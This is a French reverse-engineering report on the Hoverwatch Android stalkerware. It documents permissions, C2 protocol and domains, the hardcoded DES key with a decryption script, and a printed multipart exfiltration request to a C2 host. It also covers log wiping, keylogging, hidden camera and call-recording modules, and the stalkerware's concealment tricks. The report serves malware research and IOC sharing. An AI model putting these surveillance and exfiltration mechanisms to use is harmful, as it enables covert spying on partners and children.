# Hoverwatch v7.5.369 — Analyse complète

> **Package** : `com.android.core.mntan`
> **Version** : 7.5.369 (versionCode 369)
> **Target SDK** : 33 (Android 13)
> **Min SDK** : 19 (Android 4.4)
> **Obfuscation** : ProGuard/R8 — package renommé `p094hw` (hw = Hoverwatch)
> **Application** : `com.utils.core.CoreApplication`
> **Éditeur** : Refog Inc. (cf. §16)
> **Multi-brand** : même codebase que Snoopza v6.5.83 — cf. §16
> **Code natif** : aucun (0 méthode `native`, confirmé DexDispatch)
> **Outil** : JADX MCP + DexDispatch

> **Révisions** :
> - v1 — 2026-04-08 : analyse statique complète initiale
> - v2 — 2026-04-20 (matin) : attribution Refog + pivot multi-brand Snoopza + correction clé DES + domaines C2 seedés binaires décryptés
> - v3 — 2026-04-20 (après-midi) : décryption batch des 13 strings DES (canary `"refog"` in-binary, YouTube Kids caché), kill switch `C0744c`, format exfil multipart Apache HttpClient (PAS protobuf), schéma BDD IM `mpk_events`, flow `ActivityInstaller` (11 fragments / 18 modules togglables), correction confusion `user_type` JSON vs brand code URL
> - v4 — 2026-04-21 (matin) : analyse dynamique Corellium, système de camouflage 8-déguisements (§23), setup lab Corellium + mock C2 (§24), zéro anti-VM confirmé, mapping noms réels JADX→manifest
> - v5 — 2026-04-21 (après-midi) : diagnostic démarrage ServiceCore, bug `MOCK_DOMAINS` double port (§25), traçage complet du flow d'initialisation C2 — seed in-binary → registration → domain override, exfiltration live confirmée (logs + selfie), mécanisme de push settings via heartbeat + commandes ServiceCore (§26)
> - v6 — 2026-05-05 : cross-install device fingerprinting — mécanisme de persistance d'identification post-désinstall via fichier `/sdcard/dev_<model>` contenant l'ANDROID_ID, envoyé au C2 dans le champ `hid` (§27). IOC forensique post-uninstall. Bypass pour pipeline de test

---

## 1. Manifest — Permissions

### 1.1 Permissions de surveillance (19)

| Permission | Usage |
|------------|-------|
| `RECEIVE_SMS` / `READ_SMS` | Interception SMS |
| `READ_CALL_LOG` / `WRITE_CALL_LOG` / `PROCESS_OUTGOING_CALLS` | Journal d'appels |
| `READ_CONTACTS` | Contacts |
| `READ_CALENDAR` | Calendrier |
| `ACCESS_FINE_LOCATION` / `ACCESS_COARSE_LOCATION` / `ACCESS_BACKGROUND_LOCATION` | Géolocalisation (y compris background) |
| `READ_PHONE_STATE` / `READ_PHONE_NUMBERS` / `READ_PRIVILEGED_PHONE_STATE` | Identifiants téléphone (IMEI, numéro) |
| `RECORD_AUDIO` / `MODIFY_AUDIO_SETTINGS` | Enregistrement micro |
| `CAMERA` | Photos |
| `READ_EXTERNAL_STORAGE` / `WRITE_EXTERNAL_STORAGE` / `MANAGE_EXTERNAL_STORAGE` | Fichiers |
| `READ_LOGS` | Logs système |
| `GET_ACCOUNTS` | Comptes utilisateur |
| `READ_HISTORY_BOOKMARKS` | Historique navigateur |
| `PACKAGE_USAGE_STATS` | Apps utilisées |

### 1.2 Permissions de furtivité (stealth)

| Permission | Usage |
|------------|-------|
| `SYSTEM_ALERT_WINDOW` | Overlay (masquer l'app) |
| `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` | Empêcher l'arrêt par le système |
| `FOREGROUND_SERVICE` | Service persistant |
| `RECEIVE_BOOT_COMPLETED` | Survie au redémarrage |
| `WAKE_LOCK` | Maintien du processeur actif |
| `REQUEST_INSTALL_PACKAGES` / `REQUEST_DELETE_PACKAGES` | Auto-update / auto-suppression |
| `QUERY_ALL_PACKAGES` | Lister toutes les apps installées |
| `INTERACT_ACROSS_USERS` / `INTERACT_ACROSS_USERS_FULL` | Multi-profil (nécessite signature) |

---

## 2. Architecture — Composants

### 2.1 Services

| Classe | Rôle | Détails |
|--------|------|---------|
| `p094hw.utils.ServiceCore` | Orchestration | foregroundServiceType=location |
| `p094hw.recorder.ServiceRecording` | Enregistrement audio | process `:r` séparé |
| `p094hw.utils.ServiceScr` | Capture écran | foregroundServiceType=mediaProjection |
| `p094hw.imreader.ReaderAccessibilityService` | Interception IM | AccessibilityService |
| `p094hw.imreader.ReaderNotificationService` | Lecture notifications | NotificationListenerService |

### 2.2 Receivers

| Classe | Trigger | Rôle |
|--------|---------|------|
| `ReceiverBoot` | `BOOT_COMPLETED` (priority=100) | Redémarrage auto |
| `ReceiverOutgoingCall` | `NEW_OUTGOING_CALL` / `PHONE_STATE` | Interception appels |
| `ReceiverChangeConnection` | `CONNECTIVITY_CHANGE` / `WIFI_STATE_CHANGED` | Trigger sync réseau |
| `ReceiverUserPresent` | `USER_PRESENT` + lockscreen tiers | Détection déverrouillage |
| `ReceiverPowerEvents` | Événements batterie | Monitoring batterie |
| `ReceiverAirplaneMode` | `AIRPLANE_MODE` | Détection mode avion |
| `ReceiverAlarm` | Alarmes périodiques | Tâches planifiées |
| `ReceiverMsg` | Messages internes | Communication inter-services |

### 2.3 Activities

| Classe (manifest) | Classe (JADX) | Rôle |
|----|--------|------|
| `com.activities.ActivityMainStarter` | idem | Launcher principal → lance `ActivityMain` via `C0698a.m5190s(true)` (excludeFromRecents=true) |
| `com.activities.ActivityDblStarter` | idem | Double launcher (icône alternative) |
| `com.activities.ActivitySettingsStarter` | idem | Cover behavior : lance `android.settings.SETTINGS` puis `finish()` — ne lance PAS ActivityMain |
| `com.activities.ActivityMain` | idem | Interface de contrôle — **point d'entrée réel**, détecte `APP_STATE_NOT_INSTALLED` → lance wizard |
| `com.activities.ActivityTrScr` | idem | Activité transparente (overlay furtif, singleInstance, noHistory) |
| `hw.installer.ActivityInstaller` | `p094hw.installer.ActivityInstaller` | Assistant installation/configuration (11 fragments) |
| `com.activities.ActivityWidget` | idem | Widget anodin (point d'accès caché) |

**Notes** :
- `excludeFromRecents="true"` sur toutes les activités → invisible dans les apps récentes
- Process séparé `:r` pour l'enregistrement audio → survie indépendante
- **Noms JADX vs manifest** : JADX renomme le package `hw` en `p094hw`. Les classes sous `com.activities.*` gardent leur nom réel. Seules les classes `hw.*` sont préfixées (`p094hw.*`). Pour `am start`, utiliser le nom manifest (ex: `hw.installer.ActivityInstaller`, pas `p094hw.installer.ActivityInstaller`)
- **Flow de lancement** : `ActivityMainStarter` → `C0698a.m5190s(true)` → `startActivity(ActivityMain.class)` → `ActivityMain.onCreate()` vérifie `C0895z.m6659o() == APP_STATE_NOT_INSTALLED` → `m4853P()` lance le wizard. Les autres Starters (Settings, Dbl) sont des **cover behaviors post-installation** qui ne lancent PAS le wizard

---

## 3. Protocole C2 — Classe `p092e.p093a.C0736a`

### 3.1 Identification client

⚠ **Correction v3** : il y a deux concepts distincts qui étaient confondus dans v1/v2 :
- Le **brand code** (`HWA`/`SNPA`/`HWA_TST`) inséré dans le **path URL** (ex: `api/online/programversion/HWA/`)
- Le **`user_type`** (entier 0-3) inséré dans le **JSON de registration** (sélectionné par l'acheteur dans `FragmentInstallMonitorType`)

| Champ | Valeur | Source |
|-------|--------|--------|
| User-Agent | `Android Monitor 7.5.369` (générique, non-brandé) | hardcodé |
| **Brand code** (path URL, header) | `HWA` (Hoverwatch prod), `HWA_TST` (test), `SNPA` (Snoopza prod) | static init `C0737a.f5124e` |
| **`user_type`** (JSON registration) | entier 0-3 : `CHILD_DEVICE`/`EMPLOYEE_DEVICE`/`OWN_DEVICE`/`UNDEFINED_DEVICE` | enum `C0867b0.a`, sélection runtime via UI installer |
| Auth header | `x-auth-key: {ActivationID}` | SharedPref (DES) |
| Settings header | `x-settings-ver: {version}` | SharedPref |
| Event header | `x-client-event: {event_data}` | runtime |

Le ternaire `f5124e` dans le static init de `C0737a` (`e.a.a`) — identique bit-à-bit dans Hoverwatch et Snoopza — sélectionne le **brand code** au build time :

```java
f5124e = C0870b0.f6028x ? "SNPA" : C0870b0.f6025u ? "HWA_TST" : "HWA";
```

Le flag `f6028x` est une constante `final static` positionnée par le build variant Gradle. Pas flippable au runtime sans repatch du DEX. Voir §16 pour l'attribution et la preuve par binary diff avec Snoopza.

### 3.2 Endpoints API

| Endpoint | Méthode | Auth | Usage |
|----------|---------|------|-------|
| `api/online/registration/` | POST (JSON) | Non | Enregistrement device |
| `api/online/activation/` | POST (JSON) | Non | Activation licence |
| `api/online/check/` | POST | Non | Ping / vérification domaine |
| `api/online/programversion/{HWA\|SNPA\|HWA_TST}/` | GET | Non | Vérification mise à jour (brand code dans path) |
| `api/online/deregistration/` | POST | Oui | Reset licence |
| `api/online/exceptionlog/` | POST (multipart) | Oui | Envoi logs d'erreurs (cf. §6.5) |
| `api/online/logs/` | POST (multipart) | Oui | **Exfiltration données collectées** (cf. §6.5) |

⚠ **Correction v3** : `exceptionlog` et `logs` étaient marqués "protobuf" en v1/v2. C'est faux — c'est du `multipart/form-data` Apache HttpClient. Cf. §6.5.

### 3.3 Registration — Données envoyées

```json
{
  "username": "<email_acheteur>",
  "password": "<password_acheteur>",
  "hid": "and:<device_hardware_id>",   // cf. §27 — ANDROID_ID persisté sur sdcard
  "device_name": "<modele_telephone>",
  "client_ver": "7.5.369",
  "os_ver": "<android_version>",
  "user_type": 0,    // 0=CHILD, 1=EMPLOYEE, 2=OWN, 3=UNDEFINED — enum C0867b0.a, choisi via FragmentInstallMonitorType
  "device.dev_mac_adr_str": "<mac_wifi>",
  "device.dev_mac2_adr_str": "<mac_secondaire>",
  "device.dev_serial_num_str": "<serial>",
  "device.dev_imei_str": "<imei>",
  "device.dev_accounts_str": "<comptes_google>",
  "device.perm_118": "<état_permission>",
  "device.perm_121": "<état_permission>",
  "device.perm_116": "<état_permission>",
  "device.perm_101": "<état_permission>",
  "device.perm_102": "<état_permission>",
  "device.perm_103": "<état_permission>",
  "device.perm_129": "<état_permission>",
  "device.perm_130": "<état_permission>",
  "device.perm_128": "<état_permission>"
}
```

### 3.4 Registration — Réponse serveur

```json
{
  "status": "ok",
  "auth_key": "<activation_id>",
  "valid_through": "2026-12-31 23:59:59",
  "subscription": "<type_abonnement>",
  "domains": "https://domain1.com:443/;https://domain2.com:443/",
  "client_pin": "<code_pin>"
}
```

### 3.5 Codes de réponse HTTP

| Code | Signification | Action client |
|------|---------------|---------------|
| 200 | OK | Continue |
| 400 | Request unrecognized | Erreur |
| 401 | License locked | Augmente période sync à 720 min |
| 403 | Wrong login/pass | Erreur |
| 404 | Update not found | Ignoré |
| 409 | License limit | Erreur |
| **410** | **Remove application** | **Auto-désinstallation (kill switch)** |
| 413 | Request entity too large | Erreur |
| 422 | Unprocessable Entity | Erreur |
| 500 | Server error | Erreur |
| 502 | Bad Gateway | Erreur |

### 3.6 Gestion des domaines C2

- Format : `https://domain1.com:443/;https://domain2.com:443/;https://domain3.com:443/`
- **Rotation automatique** : en cas d'échec, domaine déplacé en fin de liste
- **Mise à jour dynamique** : le serveur envoie de nouveaux domaines via registration/activation
- Normalisation forcée : ajout `https://` et `:443/` si absents
- Fallback : si domaine échoue pendant >3h, rotation vers le suivant

### 3.6.1 Seed initial in-binary (découvert v2)

Le premier trio de domaines C2 est **shipped dans l'APK** sous forme de blob DES/ECB base64, et seedé dans les SharedPreferences `domains` lors du premier run ou après upgrade de version. Localisation : `p053c.p077c.p081d.C0624b.mo4063f()` (TskInit) :

```java
C0892z.m6635w0(
    C0867b0.f5991x                                   // flag SNPA ?
        ? C0874h.m6237c("O4MkUWSy2w8l+q9I…")          // blob Snoopza
        : C0874h.m6237c("O4MkUWSy2w/J0RDF…")          // blob Hoverwatch
);
```

Chaque APK embarque **les deux blobs côte-à-côte**, seul le flag `f5991x` (build variant) détermine lequel est utilisé. Le seed a lieu uniquement si `strVersionStockée < versionActuelle` — donc **chaque upgrade reseed les domaines**, ce qui permet à Refog de pivoter son infra C2 en poussant un nouveau build.

### 3.6.2 Domaines C2 décryptés

Clé DES/ECB : `vallengt` (8 bytes, cf. §5.2). Résultats :

**Hoverwatch (`HWA`)** :
```
https://a.syncvch.com:443/
https://i1.hoverwatch.com:443/
https://hwa.cab:443/
```

**Snoopza (`SNPA`)** :
```
https://snsync.com:443/
https://api.snoopza.com:443/
https://app.snoopza.com:443/
```

Observations :
- Pattern parallèle strict : domaine stealth non-brandé + api.brand.com + app.brand.com (ou équivalent court)
- Domaines stealth (`syncvch.com`, `snsync.com`) = anti-détection DNS (pas de brand visible dans le nom)
- TLD `.cab` pour `hwa.cab` : peu coûteux, peu surveillé — typique stalkerware/phishing kits
- **Backends séparés par brand** (pas de C2 mutualisé) → isolation pour risque légal / breach containment

### 3.6.3 Nouveaux IOCs vs AssoEchap/stalkerware-indicators

| Domaine | AssoEchap | Brand | Statut |
|---|---|---|---|
| `a.syncvch.com` | ❌ | Hoverwatch | **Nouveau** |
| `hwa.cab` | ❌ | Hoverwatch | **Nouveau** |
| `i1.hoverwatch.com` | ⚠️ partiel (`hoverwatch.com` listé) | Hoverwatch | Sous-domaine non listé |
| `snsync.com` | ❌ | Snoopza | **Nouveau** |
| `app.snoopza.com` | ❌ | Snoopza | Sous-domaine non listé |
| `api.snoopza.com` | ⚠️ partiel (`snoopza.com` listé) | Snoopza | Sous-domaine non listé |

→ **PR à proposer upstream chez AssoEchap.**

---

## 4. Sécurité SSL — Classe `p092e.p093a.C0739d`

**AUCUNE** vérification SSL :

```java
// TrustManager — accepte TOUT
public void checkClientTrusted(X509Certificate[] chain, String type) { }
public void checkServerTrusted(X509Certificate[] chain, String type) { }
public X509Certificate[] getAcceptedIssuers() { return null; }

// HostnameVerifier — accepte TOUT
public boolean verify(String hostname, SSLSession session) { return true; }
```

→ Vulnérable au MITM, tout proxy peut intercepter le trafic C2

---

## 5. Chiffrement — Classe `p094hw.utils.C0870h`

### 5.1 Algorithme

**DES en mode ECB** avec PKCS5Padding — pas de IV, pas de chaînage.

```java
// p094hw.utils.C0874h.m6239e (équivalent C0870h dans première analyse)
private static String m6239e(String key, String b64, int flags) {
    if (key.length() < 8) {
        key = key + "length 8";            // padding fixe hardcodé
    }
    SecretKey secretKey = SecretKeyFactory.getInstance("DES")
        .generateSecret(new DESKeySpec(key.getBytes(UTF_8)));
    // DESKeySpec ne garde que les 8 PREMIERS bytes
    Cipher cipher = Cipher.getInstance("DES");  // = DES/ECB/PKCS5Padding
    cipher.init(DECRYPT_MODE, secretKey);
    return new String(cipher.doFinal(Base64.decode(b64, flags)));
}
```

### 5.2 Clé effective (⚠ corrigé v2)

| Étape | Valeur |
|-------|--------|
| Clé passée par le wrapper | `"val"` (3 chars) |
| Padding (length < 8) | `"val" + "length 8"` = `"vallength 8"` (11 chars) |
| DESKeySpec garde 8 premiers bytes UTF-8 | **`"vallengt"`** (= `0x76 0x61 0x6C 0x6C 0x65 0x6E 0x67 0x74`) |

La **vraie clé DES est `vallengt`** — pas `vallength` ni `vallenge` (erreurs précédentes). Usage :
- SharedPreferences chiffrées (ActivationID, Password, domains, Subscription)
- Blobs de domaines C2 seedés dans le binaire (cf. §3.6.1)
- Strings obfusquées dans le code

### 5.3 Déchiffrement forensique

```python
# uv add pycryptodome
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
from base64 import b64decode

KEY = b"vallengt"  # 8 bytes — clé effective après padding "length 8" + troncature DESKeySpec

def decrypt_hw(b64: str) -> str:
    cipher = DES.new(KEY, DES.MODE_ECB)
    pt = cipher.decrypt(b64decode(b64))
    return unpad(pt, 8).decode()

# Exemple : blob des domaines C2 par défaut (branche HWA dans C0624b)
blob_hwa = "O4MkUWSy2w/J0RDFuayF5Ews4PV4Ocp8zP7SC0Tqr8tNqvR67gt5eLENzuZr371ILX3yaN+WuMUV\n3d5sswyBFBNI5FtH3kiMb/0dsnsdKtY="
print(decrypt_hw(blob_hwa))
# → https://a.syncvch.com:443/;https://i1.hoverwatch.com:443/;https://hwa.cab:443/
```

**Known-plaintext helper** : les blobs commencent toujours par `https://` (8 chars = 1 bloc DES) → utile pour valider rapidement la clé sans avoir à décoder PKCS5.

### 5.4 Vulnérabilités cryptographiques

1. **DES** — cassé depuis 1998 (56 bits)
2. **ECB** — patterns visibles dans le chiffré
3. **Clé `"val"` hardcodée** → tout est déchiffrable
4. **Pas de IV** → même plaintext = même ciphertext
5. **Pas de MAC/HMAC** → modification silencieuse possible

### 5.5 Décryption batch des strings obfusquées (v3)

13 blobs DES identifiés dans le code via `search_method_by_name("m6237c")` (7 classes call sites). Décryption batch via `decrypt_strings.py` (clé `vallengt`) :

| Call site | Plaintext | Catégorie |
|---|---|---|
| `C0867b0.f5968a` | `content://` | Préfixe URI ContentProvider |
| `C0612a.f4614b` | `/history` | Suffix scrape historique browser |
| `C0612a.f4615c` | `/bookmarks` | Suffix scrape bookmarks browser |
| `C0626d` browser cat=201 #1 | `com.google.android.youtube` | App cible cachée |
| `C0626d` browser cat=201 #2 | `com.google.android.apps.youtube.kids` | **App cible cachée — RED FLAG IPV** |
| `C0626d` browser cat=205 | `com.facebook.katana` | App cible cachée |
| **`C0737a.<clinit>`** | **`refog`** | **Canary d'attribution in-binary** |
| `C0624b` HWA blob | `https://a.syncvch.com:443/;https://i1.hoverwatch.com:443/;https://hwa.cab:443/` | Seed C2 Hoverwatch |
| `C0624b` SNPA blob | `https://snsync.com:443/;https://api.snoopza.com:443/;https://app.snoopza.com:443/` | Seed C2 Snoopza |
| `C0878l$a` cmd | `logcat` | Crash log scraping (cf. §21) |
| `C0878l$a` args | `-d -v time -b crash` | Crash log scraping |
| `C0878l$a` filter | `E/AndroidRuntime` | Filter Java crashes |
| `C0878l$a` clear | `-c` | **Anti-forensics : efface les logs** |

**3 findings critiques** :

1. **Canary `"refog"`** dans le static init de la classe HTTP (`C0737a`) — le résultat de `C0874h.m6237c("uHpzgHJIA7s=")` n'est pas assigné, c'est un **call à effet de bord** dont la valeur est jetée. Sa seule raison d'être : laisser une preuve d'attribution dans le binaire chiffré. Signature **forte pour rule YARA / signature statique** : tout APK contenant ce blob déchiffrable en `"refog"` appartient à l'écosystème Refog Inc.

2. **YouTube Kids caché spécifiquement par chiffrement DES** parmi ~60 apps de surveillance dont la grande majorité sont en clair. Les opérateurs savent que tracker une app pour enfants déclenche les scanners automatiques Play Protect / outils de classification stalkerware → ils l'obfusquent. **Angle IPV publiable dans le SoK** : preuve que les éditeurs ont conscience du scope de surveillance enfants et tentent activement de le dissimuler.

3. **Anti-forensics actif sur logs Android** : `logcat -c` exécuté côté victime pour effacer les logs système après extraction. Branche dormante sur Android non-rooté (READ_LOGS = signature-level depuis 4.1) mais **active sur OEM partners / devices custom-firmware**. Cf. §21.

1. **DES** — cassé depuis 1998 (56 bits)
2. **ECB** — patterns visibles dans le chiffré
3. **Clé `"val"` hardcodée** → tout est déchiffrable
4. **Pas de IV** → même plaintext = même ciphertext
5. **Pas de MAC/HMAC** → modification silencieuse possible

---

## 6. Collecteurs de données

### 6.1 Architecture d'exfiltration

```
Collecteurs (Services/Receivers/ContentObservers)
    ↓ écriture
Base de données SQLite locale (mpk_events, AbstractC0747c / AbstractC0749e)
    ↓ lecture batch
Multipart/form-data builder (Apache HttpClient — p082d.p083a.p084a.p085a = d.a.a.a)
    ↓ POST HTTPS (TrustAll)
C2 server (api/online/logs/)
```

⚠ **Correction v3** : le package `p082d.p083a.p084a.p085a` (= `d.a.a.a` dans le DEX) **n'est pas un sérialiseur protobuf custom** — c'est **Apache HttpComponents** (probablement `cz.msebera.android.httpclient`). La classe `C0707b` est `org.apache.http.entity.ContentType` (constantes statiques `application/json`, `multipart/form-data`, etc.) et `C0719k` est `MultipartEntityBuilder` (signatures `create()`, `addTextBody`, `addBinaryBody`, `build()`). Les logs sont du **HTTP multipart standard**, trivial à mocker.

### 6.2 Liste des collecteurs

| ID | Nom | Classe | Données |
|----|-----|--------|---------|
| 302 | Screenshots | `p053c.p077c.p079b.C0611d` | Captures d'écran périodiques (JPEG qualité 40%) |
| 304 | IM Reader | `p053c.p077c.p081d.C0626d` | Messages IM via AccessibilityService (100+ apps) |
| 305 | Browser | `p053c.p077c.p081d.C0626d` | URLs visitées (44+ navigateurs) |
| 312 | Call Recording | `p094hw.recorder.ServiceRecording` / `C0856j` | Enregistrements audio/appels |
| 313 | SMS | `p053c.p077c.p081d.C0626d` | SMS via Google Messages + apps dynamiques |
| 314 | Location | `p053c.p077c.p080c.C0616e` | GPS + WiFi BSSID + Cell ID |
| 319 | Front Camera | config `frcam` | **Photos silencieuses caméra frontale** |
| — | Keylogger | config `keys` | **Frappes clavier via AccessibilityService** |
| — | Contacts | `C0747d` (ContentObserver) / config `contact` | Contacts via ContentProvider |
| — | Call Log | `C0747d` (ContentObserver) | Journal d'appels via ContentProvider |
| — | Calendar | `C0747d` (ContentObserver) / config `calendar` | Événements calendrier |
| — | SIM Monitor | config `sim` | Monitoring changement de carte SIM |
| — | Files Monitor | config `files` | Monitoring fichiers (photos, documents) |
| — | App Usage | config `app` | Applications installées/lancées |

### 6.3 Flux de synchronisation (`m5329C`)

1. Vérification : licence valide + réseau dispo + délai respecté
2. Si WiFi : acquisition `WifiLock` pour maintenir la connexion
3. Ping serveur (`api/online/check/`)
4. Parse settings serveur (header `x-settings-ver`)
5. Envoi exception logs (`api/online/exceptionlog/`)
6. Envoi event logs (`api/online/logs/`)
7. Envoi données de chaque collecteur (`AbstractC0746c.m5458p()`)
8. Update timestamp `SyncServerLastTime`

### 6.5 Format exfiltration multipart (v3)

Les endpoints `api/online/logs/` et `api/online/exceptionlog/` reçoivent du `multipart/form-data` HTTP standard construit via `MultipartEntityBuilder` (Apache HttpClient).

**Naming des parts** (méthode `C0881o.m6334X`) :
```java
public static String m6334X(boolean z, int i) {
    return z ? String.format(Locale.ENGLISH, "exception%04d", i)
             : String.format(Locale.ENGLISH, "log%04d", i);
}
```

→ Parts nommées `log0001`, `log0002`, ..., `log9999` (ou `exception0001`, etc.). Content-Type par part = `application/json` (`C0707b.f5065e`).

**Format du body brut** :
```http
POST /api/online/logs/ HTTP/1.1
Host: a.syncvch.com
Content-Type: multipart/form-data; boundary=XXXXX
X-Auth-Key: <ActivationID>
X-Settings-Ver: 1
X-Client-Event: <event_data>

------XXXXX
Content-Disposition: form-data; name="log0001"
Content-Type: application/json; charset=UTF-8

{"cat": 1, "crd": [48.8566, 2.3522], "acc": 15.0, ...}
------XXXXX
Content-Disposition: form-data; name="log0002"
Content-Type: application/json; charset=UTF-8

{...}
------XXXXX--
```

**Mock C2 server FastAPI** :
```python
from fastapi import FastAPI, Request
app = FastAPI()

@app.post("/api/online/logs/")
async def logs(request: Request):
    form = await request.form()
    auth = request.headers.get("x-auth-key")
    for name, content in form.items():
        if name.startswith("log"):     # log0001, log0002, ...
            idx = int(name[3:])
            payload = await content.read() if hasattr(content, "read") else content
            print(f"[{auth}] log #{idx}: {payload[:200]}")
    return {"status": "ok"}
```

Pas de besoin de protobuf, pas de schéma à reverser. Format auto-décodable par n'importe quel proxy MITM (ex: mitmproxy intercepte les parts directement).

### 6.4 Configuration distante — Classe `p094hw.utils.C0887y`

Le serveur C2 contrôle chaque module à distance via un objet `settings` envoyé dans la réponse registration/activation. Config par défaut hardcodée dans `m6527x()` :

```json
{
  "settings": {
    "version": 1,
    "on": true,
    "debug": false,
    "onlyWiFi": false,
    "period": 10,
    "autoupdate": { "on": false },
    "location": { "on": true, "period": 10, "acc": 1000 },
    "contact": { "on": true },
    "call": { "on": true, "rec": true, "source": 4, "quality": 1, "codec": 2, "gain": false },
    "sms": { "on": true, "shot": false },
    "chat": { "on": true, "shot": false, "rec": true },
    "url": { "on": true, "shot": false },
    "sim": { "on": false },
    "calendar": { "on": true },
    "frcam": { "on": true, "photo": true },
    "shot": { "on": false, "period": 5 },
    "files": { "on": true, "shot": false },
    "app": { "on": true, "shot": false },
    "keys": { "on": true, "shot": false }
  }
}
```

Chaque module supporte :
- `on` — activer/désactiver le module
- `shot` — déclencher un screenshot sur événement
- `rec` — déclencher un enregistrement audio sur événement (chat, appels VoIP)

Paramètres audio (`call`) :
- `source` — AudioSource Android : 1=MIC, 4=VOICE_COMMUNICATION (défaut), 6=VOICE_RECOGNITION, 7=VOICE_CALL. Adaptation par fabricant : Samsung→7, Huawei→6
- `quality` — 0=basse, 1=moyenne (défaut), 2=haute
- `codec` — codec d'encodage (défaut=2)
- `gain` — amplification du gain audio (activé par défaut sur Android ≥ 28)

Paramètres localisation :
- `period` — intervalle de collecte en minutes (défaut=10)
- `acc` — précision minimum en mètres (défaut=1500)

Paramètres screenshots :
- `period` — intervalle en minutes (défaut=5)

**Implication critique** : l'acheteur/abuseur peut activer à distance le keylogger, la caméra frontale, les screenshots, et l'enregistrement audio depuis le portail web Hoverwatch.

---

## 7. Enregistrement audio — `p094hw.recorder.ServiceRecording`

- **Process séparé** (`:r`) → survit à l'arrêt du service principal
- Deux slots : `C0846c(10)` (10 min max) et `C0846c(300)` (5h max)
- Trois modes : `OFFHOOK` (détection appel), `RECORD` (enregistrement), `STOP`
- **Views invisibles** (`LinearLayout` ajoutées au `WindowManager`) pour empêcher Android de tuer le service
- Notification foreground avec ID `110111` → invisible
- Détection auto des appels VoIP via AccessibilityService (WhatsApp, etc.)

---

## 8. Capture d'écran — `p053c.p077c.p079b.C0611d`

- **MediaProjection** + `VirtualDisplay` + `ImageReader`
- Compression JPEG **qualité 40%** (faible poids → exfiltration rapide)
- Max **5 captures par session**
- Relancé toutes les **24h** via `ReceiverAlarm`
- **Android < 30 uniquement** (restrictions Google depuis Android 11)
- VirtualDisplay nommé `"Second-screen"` (tente de passer inaperçu)
- Permission obtenue une fois via `ScreenshotCheckerActivity` puis réutilisée via `PendingIntent`

---

## 9. Interception IM — `p094hw.imreader.ReaderAccessibilityService`

### 9.1 Mécanisme

Utilise l'**AccessibilityService** pour parser l'arbre d'accessibilité des apps cibles. Pour chaque app, un parser dédié (ex: `C0776p` pour WhatsApp) navigue dans les `AccessibilityNodeInfo` en utilisant les **resource IDs** des éléments UI :

```
com.whatsapp:id/conversations_row_contact_name → nom du contact
com.whatsapp:id/conversation_contact_name → nom dans la conv
com.whatsapp:id/conversation_root_layout → layout racine
com.whatsapp:id/date → horodatage
com.whatsapp:id/thumb → média thumbnail
com.whatsapp:id/sticker_image → stickers
com.whatsapp:id/call_screen → détection appel
com.whatsapp:id/ringing_dots → appel sortant
com.whatsapp:id/toggle_video_btn → appel vidéo
```

### 9.2 Données interceptées

Structure `InstantMessage` :
- `_time_stamp` — horodatage du message
- `_seen_time` — quand le message a été vu
- `_from` — expéditeur
- `_msg_text` — contenu textuel
- `_msg_type` — type (texte=0, image=1, sticker=5, vidéo=6)
- `_direction` — `INBOUND` / `OUTBOUND`
- `_index` — index dans la conversation

### 9.5 Schéma BDD messages IM (v3) — Classe `p094hw.database.C0752h` (équiv. `C0751h` Hoverwatch)

CREATE TABLE extrait de la méthode `mo4669A()` :

```sql
CREATE TABLE IF NOT EXISTS mpk_events (
    _id    INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid   VARCHAR NOT NULL,                 -- identifiant unique du message
    status INTEGER DEFAULT '0' NOT NULL,     -- 0=à envoyer, 1=envoyé
    time   INTEGER DEFAULT '-1' NOT NULL,    -- timestamp du message (ms epoch)
    im     INTEGER NOT NULL,                 -- code app (1=?, 4, 5, 6, 7, 9, 11, 13, 31)
    cat    INTEGER DEFAULT '-1' NOT NULL,    -- catégorie (direction in/out/seen)
    name   VARCHAR,                          -- nom du contact / chat
    chat   VARCHAR,                          -- nom du groupe si applicable
    me     VARCHAR,                          -- identifiant user local
    res    VARCHAR,                          -- resource (attachement, thumbnail)
    link   VARCHAR,                          -- URL
    data   VARCHAR                           -- contenu textuel
);
```

**Structure runtime — classe `C0752h.i` (un message en mémoire)** :

| Field | Nom logique | Type | Description |
|---|---|---|---|
| `f5247a` | `im` | int | Code de l'app (1, 4, 5, 6, 7, 9, 11, 13, 31, ...) |
| `f5248b` | `cnt` | String | Identifiant conversation |
| `f5249c` | `time` | long | Timestamp envoi/réception |
| `f5250d` | `seen_time` | long | Timestamp vu |
| `f5251e` | `direction` | int | 1=inbound, 2=outbound, 3=seen |
| `f5252f` | `msg_text` | String | Contenu texte |
| `f5253g` | `data_clean` | String | Texte nettoyé (lazy) |
| `f5254h` | `from` | String | Expéditeur |
| `f5255i` | `msg_type` | int | 1=sticker, 2=image, 4=video, 5=audio, 6=document |
| `f5256j` | `attachments` | Object[] | `(File, mimetype, width)` |

**Codes `msg_type` (placeholders via `m5503b0`)** :
```
type=1 → "<sticker>"
type=2 → "<image>"
type=3 → <ressource 5279d>
type=4 → "<video>"
type=5 → "<audio>"
type=6 → "<document>"
```

**Comportements opérationnels** :

- **Rétention max 300 msgs / conv / app** — au-delà, les plus anciens sont purgés (`SELECT WHERE im=? AND name=? ORDER BY time ASC` + `DELETE` du surplus)
- **Dédup temporelle** : deux messages avec mêmes `(im, name, data, cat)` dans une fenêtre temporelle sont considérés duplicates. Fenêtre par `im` :
  - `im=1` ou `im=31` → 60 secondes
  - `im=4, 5, 6, 7, 9, 11, 13` → 180 secondes
  - autres → 120 secondes (fallback)
- **Alarme périodique** : `f5228m = "C_A_M_" + deviceId + (SNPA ? "-S" : "")` → `ReceiverAlarm` traite la queue toutes les 60 secondes
- **Gestion attachments** : si un message a un fichier joint (image/vidéo/audio/document), il est copié dans le dossier du collecteur (`f5204b`) et tracé via uuid. Limite taille : 200 MB par fichier (`209715200` bytes)
- **Le nom de table `mpk_events` est partagé** entre plusieurs collecteurs (location, IM, contacts, etc.) — chaque collecteur a sa propre DB SQLite dans un fichier séparé

### 9.3 Parsers IM identifiés

| Classe | App | Package |
|--------|-----|---------|
| `C0776p` | WhatsApp | `com.whatsapp` |
| `C0764d` | Facebook Messenger | `com.facebook.orca` |
| `C0769i` | Instagram | `com.instagram.android` |
| `C0765e` | Viber | `com.viber.voip` |
| `C0766f` | Telegram | `org.telegram.messenger` |
| `C0771k` | Skype | `com.skype.raider` |
| `C0773m` | Snapchat | `com.snapchat.android` |
